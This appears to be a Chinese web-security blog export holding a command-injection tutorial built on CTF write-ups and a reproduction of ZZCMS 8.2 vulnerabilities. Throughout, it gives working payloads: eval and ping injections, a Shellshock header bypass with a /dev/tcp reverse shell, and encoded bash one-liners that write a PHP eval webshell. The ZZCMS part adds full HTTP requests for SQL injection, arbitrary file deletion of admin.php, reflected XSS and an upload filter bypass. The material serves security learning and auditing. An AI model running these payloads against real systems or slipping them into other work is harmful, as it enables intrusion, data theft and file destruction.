比如有如下代码： 12345$key = &#x27;system&#x27;;ob_start($key);echo &#x27;ls -al&#x27;;ob_end_flush();# -rw-r–r– 1 root root 0 Mar 12 06:46 tets 因为这里的$sky被作为输出的回调函数，而我们输入的ls -al在缓冲区，经过ob_end_flush()输出缓冲区后，可以得到system('ls -al')，这样的操作，所以成功执行了命令。 从CTF看命令执行漏洞的利用 bugku 本地包含 打开看到代码，两个要注意的点 $a = @a=@_REQUEST[‘hello’]; eval( “var_dump($a);”); 第一个的意思就是不管你是post还是get传参，request都能获取到hello的值 第二个看到eval()命令执行函数，也就是说，eval可以执行括号内的php命令 如果可以构造一些可执行的php代码，则eval就会全部执行达到我们想要的目的，例如： 1234567891011121314151617hello&#x3D;);print_r(file(“flag.php”)hello&#x3D;);var_dump(file(“flag.php”)hello&#x3D;file(“flag.php”)hello&#x3D;file_get_contents(‘flag.php’)hello&#x3D;);include(@$_POST[‘b’]- 在POST区域：b&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phphello&#x3D;);include(“php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php”hello&#x3D;1);show_source(‘flag.php’);var_dump(hello&#x3D;1);show_source(%27flag.php%27);var_dump(3 分别会有什么样的结果呢： 1234567891011121314151617eval( “var_dump();print_r(file(“flag.php”));”);eval( “var_dump();var_dump(file(“flag.php”));”);eval( “var_dump(file(“flag.php”));”);eval( “var_dump(file_get_contents(‘flag.php’));”);eval( “var_dump();include(@$_POST[‘b’]);”);eval( “var_dump();include(“php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php”);”);- b&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phpeval( “var_dump(1);show_source(‘flag.php’);var_dump();”);eval( “var_dump(1);show_source(%27flag.php%27);var_dump(3);”); 最终都可以get flag。 eval() 函数存在命令执行漏洞，构造出文件包含会把字符串参数当做代码来执行。 file() 函数把整个文件读入一个数组中，并将文件作为一个数组返回。 print_r() 函数只用于输出数组。 var_dump() 函数可以输出任何内容：输出变量的容，类型或字符串的内容，类型，长度。 hello=file(“flag.php”)，最终会得到var_dump(file(“flag.php”))，以数组形式输出文件内容。 include()函数和php://input，php://filter结合很好用，php://filter可以用与读取文件源代码，结果是源代码base64编码后的结果。 攻防世界 command execution ping一个 127.0.0.1 | ls …/…/…/home 只执行后面半句，看到…/…/…/home目录下的所有文件，就看到了flag.txt 查看flag.txt 用cat命令 127.0.0.1 | cat …/…/…/home/flag.txt 就可以get flag Windows： | 直接执行后面的语句 ping 127.0.0.1|whoami || 前面出错执行后面的 ，前面为假 ping 2 || whoami &amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami &amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami Linux： | 管道符，显示后面的执行结果 ping 127.0.0.1|whoami || 当前面的执行出错时执行后面的 ping 1||whoami &amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami &amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami hackme command executor 题目地址：command-executor——来源于 HackMe 题目涉及到的考察点： 文件包含读源码 代码分析（PHP，C） CVE shellshock 反弹shell Linux下输出输入重定向 首先题目提供了几个模块，第一个是man命令的帮助文档： 选择了bash参数发现多了一个file=bash的请求参数，尝试使用其他命令，比如：pwd 猜测eval(&quot;man /bin/&quot; + command)或者一些其他的目录。 Tar Tester界面可以上传压缩包但是并没有解压，只是tar -tvf test.tar查看压缩包内的内容。 Cmd Exec只能执行两个命令：ls、env。 List Files可以列举几个目录。 再观察题目url的形式：https://command-executor.hackme.inndy.tw/index.php?func=untar等均带有func=xxx参数来展示页面，猜测会有文件包含漏洞，尝试使用func=php://filter/read=convert.base64-encode/resource=index读取文件内容，成功得到回显： 我们可以用下面这个脚本分别把主页和其他四个模块的PHP源码下载下来： 123456789101112131415import requestsimport codecsimport base64from bs4 import BeautifulSoupurl=&quot;https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=&quot;file_list = [&quot;index&quot;,&quot;man&quot;,&quot;untar&quot;,&quot;ls&quot;,&quot;cmd&quot;]for i in file_list: res = requests.get(url+i) print(&quot;dowload &quot;+i) if res.status_code==200: res.encoding=&quot;utf8&quot; with codecs.open(i+&quot;.php&quot;,&quot;w+&quot;,&quot;utf8&quot;) as handle: print(&quot;done&quot;) text = BeautifulSoup(res.text,&quot;lxml&quot;).text.split(&#x27;\\n&#x27;)[0] handle.write(base64.b64decode(text).decode(&#x27;utf8&#x27;)) index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;?php$pages = [ [&#x27;man&#x27;, &#x27;Man&#x27;], [&#x27;untar&#x27;, &#x27;Tar Tester&#x27;], [&#x27;cmd&#x27;, &#x27;Cmd Exec&#x27;], [&#x27;ls&#x27;, &#x27;List files&#x27;],];function fuck($msg) &#123; header(&#x27;Content-Type: text/plain&#x27;); echo $msg; exit;&#125;$black_list = [ &#x27;\\/flag&#x27;, &#x27;\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;&#x27;];function waf($a) &#123; global $black_list; if(is_array($a)) &#123; foreach($a as $key =&gt; $val) &#123; waf($key); waf($val); &#125; &#125; else &#123; foreach($black_list as $b) &#123; if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123; fuck(&quot;$b detected! exit now.&quot;); &#125; &#125; &#125;&#125;waf($_SERVER);waf($_GET);waf($_POST);function execute($cmd, $shell=&#x27;bash&#x27;) &#123; system(sprintf(&#x27;%s -c %s&#x27;, $shell, escapeshellarg($cmd)));&#125;foreach($_SERVER as $key =&gt; $val) &#123; if(substr($key, 0, 5) === &#x27;HTTP_&#x27;) &#123; putenv(&quot;$key=$val&quot;); &#125;&#125;$page = &#x27;&#x27;;if(isset($_GET[&#x27;func&#x27;])) &#123; $page = $_GET[&#x27;func&#x27;]; if(strstr($page, &#x27;..&#x27;) !== false) &#123; $page = &#x27;&#x27;; &#125;&#125;if($page &amp;&amp; strlen($page) &gt; 0) &#123; try &#123; include(&quot;$page.php&quot;); &#125; catch (Exception $e) &#123; &#125;&#125;function render_default() &#123; ?&gt;&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;&lt;img src=&quot;windows-run.jpg&quot; alt=&quot;command executor&quot;&gt;&lt;?php &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Command Executor&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;comic-neue/font.css&quot; media=&quot;all&quot;&gt; &lt;style&gt; nav &#123; margin-bottom: 1rem; &#125; img &#123; max-width: 100%; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt; &lt;ul class=&quot;navbar-nav&quot;&gt;&lt;?php foreach($pages as list($file, $title)): ?&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt; &lt;/li&gt;&lt;?php endforeach; ?&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable(&#x27;render&#x27;)) render(); else render_default(); ?&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; man.php 123456789101112131415161718192021222324252627282930&lt;?phpfunction render() &#123; $file = &#x27;man&#x27;; if(isset($_GET[&#x27;file&#x27;])) &#123; $file = (string)$_GET[&#x27;file&#x27;]; if(preg_match(&#x27;/^[\\w\\-]+$/&#x27;, $file) !== 1) &#123; echo &#x27;&lt;pre&gt;Invalid file name!&lt;/pre&gt;&#x27;; return; &#125; &#125; echo &#x27;&lt;h1&gt;Online documents&lt;/h1&gt;&#x27;; $cmds = [ &#x27;bash&#x27;, &#x27;ls&#x27;, &#x27;cp&#x27;, &#x27;mv&#x27; ]; echo &#x27;&lt;ul&gt;&#x27;; foreach($cmds as $cmd) &#123; printf(&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=man&amp;file=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;, $cmd); &#125; echo &#x27;&lt;/ul&gt;&#x27;; printf(&#x27;&lt;h2&gt;$ man %s&lt;/h2&gt;&#x27;, htmlentities($file)); echo &#x27;&lt;pre&gt;&#x27;; execute(sprintf(&#x27;man %s | cat&#x27;, escapeshellarg($file))); echo &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; untar.php 1234567891011121314151617181920212223&lt;?phpfunction render() &#123;?&gt;&lt;h1&gt;Tar file tester&lt;/h1&gt;&lt;p&gt;Please upload a tar file to test&lt;/p&gt;&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php?func=untar&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;tarfile&quot; id=&quot;tarfile&quot;&gt; &lt;input class=&quot;btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Upload &amp;amp; Test&quot;&gt;&lt;/form&gt;&lt;?php if(isset($_FILES[&#x27;tarfile&#x27;])) &#123; printf(&#x27;&lt;h2&gt;$ tar -tvf %s&lt;/h2&gt;&#x27;, htmlentities($_FILES[&#x27;tarfile&#x27;][&#x27;name&#x27;])); echo &#x27;&lt;pre&gt;&#x27;; execute(sprintf(&#x27;tar -tvf %s 2&gt;&amp;1&#x27;, escapeshellarg($_FILES[&#x27;tarfile&#x27;][&#x27;tmp_name&#x27;]))); echo &#x27;&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; cmd.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpfunction render() &#123; $cmd = &#x27;&#x27;; if(isset($_GET[&#x27;cmd&#x27;])) &#123; $cmd = (string)$_GET[&#x27;cmd&#x27;]; &#125;?&gt;&lt;h1&gt;Command Execution&lt;/h1&gt;&lt;?php echo &#x27;&lt;ul&gt;&#x27;; $cmds = [&#x27;ls&#x27;, &#x27;env&#x27;]; foreach($cmds as $c) &#123; printf(&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=cmd&amp;cmd=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;, $c); &#125; echo &#x27;&lt;/ul&gt;&#x27;;?&gt;&lt;form action=&quot;index.php&quot; method=&quot;GET&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;func&quot; value=&quot;cmd&quot;&gt; &lt;div class=&quot;input-group&quot;&gt; &lt;input class=&quot;form-control&quot; type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;cmd&quot;&gt; &lt;div class=&quot;input-group-append&quot;&gt; &lt;input class=&quot;btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Execute&quot;&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt;&lt;script&gt;cmd.focus();&lt;/script&gt;&lt;?php if(strlen($cmd) &gt; 0) &#123; printf(&#x27;&lt;h2&gt;$ %s&lt;/h2&gt;&#x27;, htmlentities($cmd)); echo &#x27;&lt;pre&gt;&#x27;; switch ($cmd) &#123; case &#x27;env&#x27;: case &#x27;ls&#x27;: case &#x27;ls -l&#x27;: case &#x27;ls -al&#x27;: execute($cmd); break; case &#x27;cat flag&#x27;: echo &#x27;&lt;img src=&quot;cat-flag.png&quot; alt=&quot;cat flag&quot;&gt;&#x27;; break; default: printf(&#x27;%s: command not found&#x27;, htmlentities($cmd)); &#125; echo &#x27;&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; ls.php 1234567891011121314151617181920212223&lt;?phpfunction render() &#123; $file = &#x27;.&#x27;; if(isset($_GET[&#x27;file&#x27;])) &#123; $file = (string)$_GET[&#x27;file&#x27;]; &#125; echo &#x27;&lt;h1&gt;Dictionary Traversal&lt;/h1&gt;&#x27;; echo &#x27;&lt;ul&gt;&#x27;; $dirs = [&#x27;.&#x27;, &#x27;..&#x27;, &#x27;../..&#x27;, &#x27;/etc/passwd&#x27;]; foreach($dirs as $dir) &#123; printf(&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=ls&amp;file=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;, $dir); &#125; echo &#x27;&lt;/ul&gt;&#x27;; printf(&#x27;&lt;h2&gt;$ ls %s&lt;/h2&gt;&#x27;, htmlentities($file)); echo &#x27;&lt;pre&gt;&#x27;; execute(sprintf(&#x27;ls -l %s&#x27;, escapeshellarg($file))); echo &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; 接下来我们就可以利用ls.php来找flag了，因为ls.php没什么过滤，所以用func=ls&amp;file=../../../可以发现根目录下的文件： 接下来就是考虑怎么读flag、flag-reader和flag-reader.c这三个文件了。 untar.php默认执行tar -tvf命令没有可利用的地方，man.php有用户可控制的参数file，但是preg_match('/^[\\w\\-]+$/', $file) !== 1限制的比较死，而cmd.php给出了env命令，显示了当前bash的环境变量，而且，在index.php中也有一个比较特殊的PHP函数putenv： 比较容易让人想到也可以比较容易搜到ShellShock漏洞。 Bash破壳漏洞原理介绍 123456789101112131415161718192021222324252627282930313233$black_list = [ &#x27;\\/flag&#x27;, &#x27;\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;&#x27;];function waf($a) &#123; global $black_list; if(is_array($a)) &#123; foreach($a as $key =&gt; $val) &#123; waf($key); waf($val); &#125; &#125; else &#123; foreach($black_list as $b) &#123; if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123; fuck(&quot;$b detected! exit now.&quot;); &#125; &#125; &#125;&#125;waf($_SERVER);waf($_GET);waf($_POST);function execute($cmd, $shell=&#x27;bash&#x27;) &#123; system(sprintf(&#x27;%s -c %s&#x27;, $shell, escapeshellarg($cmd)));&#125;foreach($_SERVER as $key =&gt; $val) &#123; if(substr($key, 0, 5) === &#x27;HTTP_&#x27;) &#123; putenv(&quot;$key=$val&quot;); &#125;&#125; 关键就在putenv函数，由于ShellShock漏洞 padyload 需要参数，我们就可以利用putenv实现参数传递，直接设置User-agent: () &#123; :;&#125;; echo 222222，发现被 waf。 从最后一个foreach中可以看到，它会把以HTTP_开头的元素设置到环境变量中，在一次HTTP请求中，有如下字段符合要求： HTTP_ACCEPT_LANGUAGE: zh-CN,zh;q=0.9 HTTP_ACCEPT_ENCODING: gzip, deflate, br HTTP_SEC_FETCH_MODE: navigate HTTP_SEC_FETCH_SITE: cross-site HTTP_ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 HTTP_SEC_FETCH_USER: ?1 HTTP_USER_AGENT: test HTTP_UPGRADE_INSECURE_REQUESTS: 1 HTTP_CACHE_CONTROL: max-age=0 HTTP_CONNECTION: keep-alive HTTP_HOST: localhost 这里面HTTP_USER_AGENT比较好利用。 查看这个正则表达式，发现可以在中间的&#125;;中间加一个空格绕过，即User-agent: () &#123; : ;&#125;; echo test 可以正常回显，再回来看那三个文件，flag需要root权限读，那么先从flag-reader.c下手，设置User-Agent: () &#123; : ;&#125;; cat /?lag-reader.c，发现flag被屏蔽，使用*通配符绕过：() &#123; : ;&#125;; /bin/cat /fla*.c，读到flag-reader.c文件： 123456789101112131415161718192021222324252627282930313233#include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char buff[4096], rnd[16], val[16]; if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123; write(1, &quot;Not enough random\\n&quot;, 18); &#125; setuid(1337); seteuid(1337); alarm(1); write(1, &amp;rnd, sizeof(rnd)); read(0, &amp;val, sizeof(val)); if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123; int fd = open(argv[1], O_RDONLY); if(fd &gt; 0) &#123; int s = read(fd, buff, 1024); if(s &gt; 0) &#123; write(1, buff, s); &#125; close(fd); &#125; else &#123; write(1, &quot;Can not open file\\n&quot;, 18); &#125; &#125; else &#123; write(1, &quot;Wrong response\\n&quot;, 16); &#125;&#125; 审计这个C源程序，大致原理就是：1秒之内把他输出的随机字符串再输入回去，就可以打出文件内容。 所以目标就是通过flag-reader flag命令来读取flag文件中的内容，我们可以通过反弹shell和重定向来达到这目的，我们将输出写到某个文件中，再自动输入即可。 先阿里云上监听11000端口，再利用shellshock漏洞执行() &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1 反弹shell可以看这里 反弹shell这里卡了我一天的时间，命令应该是执行成功了，但是就是在阿里云主机上没有回显，最后发现不仅要配置安全组还要在centos上对开放这个端口的防火墙。 我们再去找可写目录，发现 /var/tmp具有写权限 我们再构造payload：() &#123; : ; &#125;; flag-reader flag &gt; /var/tmp/ca01h &lt; /var/tmp/ca01h，查看cat ca01h，得到flag： 命令执行的绕过方式 空格过滤 空格可以用以下字符代替： %20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125; $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 一些命令分隔符 12linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||windows中：%0a、&amp;、|、%1a（作为.bat文件中的命令分隔符） 在 shell 中，担任连续指令功能的符号就是;。 &amp;放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个&amp;实现这个目的。 管道符&quot;|&quot;左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示。 我们来看一个实例，测试代码如下： 12345678&lt;?php $file_name = $_GET[&quot;path&quot;]; if(!preg_match(&quot;/^[\\/a-zA-Z0-9-_\\\\s]+.rpt$/m&quot;, $file_name)) &#123; echo &quot;regex failed&quot;; &#125; else &#123; echo exec(&quot;/usr/bin/file -i -b &quot; . $file_name); &#125; ?&gt; 这个程序的含义就是匹配文件名由字母、数字、下划线、破则号、斜杠、空白字符各种组合的并且后缀名是rpt的文件，如果匹配成功，就执行系统命令file打印文件的类型和编码信息，如果匹配失败就打印’regex failed’。 攻击点在\\\\s正则过滤上，\\\\s 意思是匹配任何空白字符，何为空白字符，就是常见的[trnf] (Tab、回车、换行、换页)等特殊字符，这里换行符就很危险，换行符在其他场景可能没有风险，但是在shell环境下，就有可能造成命令注入，看看下面这段payload： 1file%0aid%0a.rpt %0a是URL编码后的换行符，在shell的环境中执行： 因为在shell环境中多个命令的分隔符除了;之外还有换行符，上述payload 传入shell之后，就变成两条命令执行： 123file -i -b file%0Aid%0A.rpt 所以就出现了打印id命令执行的内容。 要解决这个绕过可以把\\\\s直接换成空格，即preg_match(&quot;/^[\\/a-zA-Z0-9-_ ]+.rpt$/m&quot;, $file_name)，但是仍然可以构造payload来注入命令： 1file.rpt%0aid 在php中，/m表示开启多行匹配模式，开启多行匹配模式之后^和$的含义就发生了变化，没开启多行模式之前(即单行匹配模式), ^ 和$ 是匹配字符串的开始和结尾，开启多行模式之后，多行模式^,$可以匹配每行的开头和结尾，所以上述payload里面含有换行符，被当做两行处理，一行匹配OK即可，所以进入了exec执行分支，进而导致命令执行。 花括号的其他用法 在Linux bash中还可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令： 黑名单绕过 拼接绕过 a=l;b=s;$a$b 直接参考一道代码审计的题目 123456789101112131415161718192021222324252627&lt;center&gt;&lt;h2&gt;calc&lt;&#x2F;h2&gt;&lt;?php$str&#x3D;&quot;&quot;;if(!empty($_GET))&#123; $str&#x3D;$_GET[&quot;calc&quot;]; if(strpos($str,&quot;#&quot;)!&#x3D;&#x3D;false) die; if(strpos($str,&quot;&#96;&quot;)!&#x3D;&#x3D;false) die; if(strpos($str,&quot;flag&quot;)!&#x3D;&#x3D;false) die;&#125;?&gt;&lt;form action&#x3D;&quot;.&#x2F;index.php&quot;&gt;input: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;calc&quot; value&#x3D;&quot;&lt;?php echo $str;?&gt;&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;&lt;&#x2F;form&gt;&lt;?php echo &quot;result:&quot;.shell_exec(&quot;echo $str | bc&quot;);?&gt;&lt;&#x2F;center&gt;&lt;?phpshow_source(__FILE__); 这里过滤了&quot;#、`“和&quot;flag” payload：?calc=1;a=fl;b=ag;cat $a$b;1 用字符串拼接绕过flag，用;绕过| bc 编码绕过 base64： 12echo MTIzCg&#x3D;&#x3D;|base64 -d 其将会打印123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag hex： 1echo &quot;636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag oct： 12345$(printf &quot;\\154\\163&quot;) &#x3D;&#x3D;&gt;ls$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag&#123;printf,&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;&#125;|\\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;$&#123;printf,&quot;\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76&quot;&#125; &gt;&gt; 1.php 单引号和双引号绕过 1ca&#39;&#39;t flag 或 1ca&quot;&quot;t flag 反斜杠绕过 1ca\\t fla\\g Shell特殊变量绕过 变量 含义 $0 当前脚本的文件名 $n 传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。 $# 传递给脚本或函数的参数个数 $* 传递给脚本或函数的所有参数，而参数不存在时其值为空。 $@ 传递给脚本或函数的所有参数，而参数不存在时其值为空。被双引号包含时，与$*稍有不同 $? 上个命令的退出状态，或函数的返回值 $$ 当前shell进程ID 比如：ca$@t fla$@g 长度限制 https://www.freebuf.com/articles/web/154453.html 看这篇文章的时候对*v为什么等价于rev v很疑惑，后来知道了Bash 接收到命令以后，发现里面有通配符，会进行通配符扩展，然后再执行命令。也就是*v先扩展为rev v然后再执行。 通配符 有关命令通配符的教程：http://www.ruanyifeng.com/blog/2018/09/bash-wildcards.html","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"命令执行","slug":"命令执行","permalink":"http://ca0y1h.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"【代码审计】ZZCMS8.2（复现）","date":"2020-01-15T03:38:50.000Z","path":"code_audit/11.ZZCMS8.2审计/","text":"【代码审计】ZZCMS8.2（复现） SQL注入漏洞 SQL注入漏洞首先看一下这个CMS防SQL注入的过滤代码，/inc/stopsqlin.php： 只针对了POST、GET和COOKIE三个地方做了过滤。 /user/del.php首先包含了两个文件../inc/conn.php和check.php，其中check.php一共有五处SQL查询： 其中第二处调用的getip()函数来获取查询参数 这个地方并没有进行参数检查，所以可以通过X-Forwarded-For头部字段进行注入 12345678910111213GET &#x2F;user&#x2F;del.php HTTP&#x2F;1.1Host: zzcms:8888Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;zzcms:8888&#x2F;user&#x2F;logincheck.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;ba56df951ed3d63883d9006ca742fe0e; bdshare_firstime&#x3D;1609736297825; UserName&#x3D;test; PassWord&#x3D;098f6bcd4621d373cade4e832627b4f6X-Forwarded-For: 1.1.1.1&#39;Connection: close 用SQLMAP跑 这种X-Forwarded-For注入还存在于/user/logincheckin.php和/admin/logincheckin.php中。 还是del.php文件，第137行的tablename不需要引号闭合，并且只经过trim函数的清洗，没有任何过滤： 查询zzcms_answer表，使用union联合注入+延时注入，payload： 1id&#x3D;1&amp;tablename&#x3D;zzcms_answer where id&#x3D;999999999 union select 1,2 and if((ascii(substr(user(),1,1)) &#x3D; 114),sleep(3),1)# 任意文件删除漏洞 漏洞发生在/user/adv.php，$f变量直接由&quot;../&quot;与$oldimg拼接而得，并未过滤.和/字符，导致跨目录删除文件。所以按照代码逻辑，我们只要让$img不等于$oldimg，且$action等于”modify”即可。 Payload： 1234567891011121314151617POST &#x2F;user&#x2F;adv.php?action&#x3D;modify HTTP&#x2F;1.1Host: zzcms:8888Content-Length: 110Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;zzcms:8888Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;zzcms:8888&#x2F;user&#x2F;adv.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;ba56df951ed3d63883d9006ca742fe0e; bdshare_firstime&#x3D;1609736297825; UserName&#x3D;test; PassWord&#x3D;098f6bcd4621d373cade4e832627b4f6Connection: closeadv&#x3D;111&amp;advlink&#x3D;%2Fzt%2Fshow.php%3Fid%3D1&amp;company&#x3D;%E8%B5%9E%E5%8A%A9&amp;oldimg&#x3D;admin&#x2F;admin.php&amp;img&#x3D;test&amp;Submit22&#x3D;%E4%BF%AE+%E6%94%B9 同样的漏洞也出现在license_save.php中： 根据代码逻辑，$action=modify并且$old_img不等于$img和/img/nopic.gif，即可触发该漏洞。 系统重装漏洞 在Install目录下，step1.php会首先判断是否存在install.lock文件，但是在step2.php及之前的文件中，没有进行判断，导致系统重装漏洞： 反射型XSS漏洞 在inc/top.php中，没有包含/inc/conn.php和check.php两个文件，导致反射型XSS漏洞产生。 payload： 1234567891011121314151617POST /inc/top.php HTTP/1.1Host: zzcms:8888Content-Length: 89Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Origin: http://zzcms:8888Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://zzcms:8888/inc/top.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=ba56df951ed3d63883d9006ca742fe0e; bdshare_firstime=1609736297825; UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6Connection: closeaction=search&amp;lb=%23%27%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3Cscript%3E 文件上传漏洞 /uploadimg.php文件提供了一个文件上传的功能，首先，先判断文件是否存在，再检查文件是否超过限制，接着检查文件类型，这里可以用GIF89a绕过检查，最后使用黑名单机制检查文件后缀，问题就出在这里，黑名单少过滤了phtml，而apache会将phtml文件按照php文件来解析。 payload如下： Reference 